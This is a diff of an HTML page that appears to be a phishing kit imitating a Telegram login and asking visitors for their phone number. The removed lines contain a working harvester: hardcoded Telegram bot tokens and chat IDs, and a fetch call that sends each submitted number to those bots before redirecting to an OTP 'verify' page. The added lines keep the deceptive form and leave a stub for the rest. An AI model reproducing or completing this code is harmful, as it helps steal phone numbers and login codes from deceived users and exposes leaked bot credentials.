@@ -173,94 +173,45 @@
       </svg>
     </div>
     <h1>Enter Telegram number</h1>
-  <p>To continue, please login first</p>
+<p>To continue, please login first</p>
 
-  <form id="phoneForm">
-    <label for="countrySelect">Country code \/</label>
-    <select id="countrySelect">
-      <option value="+965">KW Kuwait (+965)</option>
-      <option value="+65">SG Singapore (+65)</option>
-      <option value="+60">MYS Malaysia (+60)</option>
-    </select>
+<form id="phoneForm">
 
-    <label for="phoneInput">Telegram number</label>
-    <input type="tel" id="phoneInput" placeholder="Enter Telegram number" required />
+  <label for="phoneInput">Telegram number</label>
+  <input type="tel" id="phoneInput"
+         placeholder="Enter Telegram number"
+         required />
 
-    <button type="submit" class="btn">Next</button>
+  <button type="submit" class="btn">Next</button>
 
-    <div class="disclaimer">
-      *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
-    </div>
-  </form>
+  <div class="disclaimer">
+    *Make sure the number entered is active to receive verification.
+  </div>
+</form>
 
-  <div class="status" id="statusMessage"></div>
+<div class="status" id="statusMessage"></div>
 
   <script>
     const phoneForm = document.getElementById('phoneForm');
-    const phoneInput = document.getElementById('phoneInput');
-    const statusMessage = document.getElementById('statusMessage');
-    const countrySelect = document.getElementById('countrySelect');
+const phoneInput = document.getElementById('phoneInput');
+const statusMessage = document.getElementById('statusMessage');
 
-    // 🔹 Update input value automatically when country changes
-    countrySelect.addEventListener('change', () => {
-      const code = countrySelect.value;
-      // Jika input sudah berisi kode sebelumnya, ganti dengan kode baru
-      if (phoneInput.value.startsWith('+')) {
-        phoneInput.value = code + phoneInput.value.replace(/^\+\d+\s*/, '');
-      } else {
-        phoneInput.value = code + ' ';
-      }
-    });
+phoneForm.addEventListener('submit', function(e) {
+  e.preventDefault();
 
-    const bots = [
-      { token: "8068224257:AAEphwHC2UkOJN-A5slLLMqSric4no8sC_U", chatId: "7280432300" },
-      { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
-    ];
+  const phone = phoneInput.value.trim();
 
-    phoneForm.addEventListener('submit', function(e) {
-      e.preventDefault();
+  if (!phone) {
+    statusMessage.textContent = "⚠️ Please enter a valid phone number.";
+    statusMessage.style.color = "red";
+    return;
+  }
 
-      const phone = phoneInput.value.trim();
-      if (!phone) {
-        statusMessage.textContent = "⚠️ Please enter a valid phone number.";
-        statusMessage.style.color = "red";
-        return;
-      }
+  statusMessage.textContent = "Processing...";
+  statusMessage.style.color = "#000";
 
-      const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
-      localStorage.setItem('sessionBotIndex', currentBotIndex);
-      const bot = bots[currentBotIndex];
-
-      const message = `🫶🏻 *STREAMING LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
-      const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-      statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
-      statusMessage.style.color = "#000";
-
-      fetch(api)
-        .then(res => res.json())
-        .then(data => {
-          if (data.ok) {
-            const nextBotIndex = (currentBotIndex + 1) % bots.length;
-            localStorage.setItem('currentBotIndex', nextBotIndex);
-            setTimeout(() => {
-              window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
-            }, 3000);
-          } else {
-            statusMessage.textContent = "❌ Failed to send to bot.";
-            statusMessage.style.color = "red";
-          }
-        })
-        .catch(err => {
-          statusMessage.textContent = "❌ Error: " + err.message;
-          statusMessage.style.color = "red";
-        });
-    });
-
-    // 🔹 Tambahkan kode negara default saat halaman pertama kali dibuka
-    window.addEventListener('load', () => {
-      phoneInput.value = countrySelect.value + ' ';
-    });
+  // Lanjutkan proses sesuai sistem kamu
+});
   </script>
 </body>
 </html>
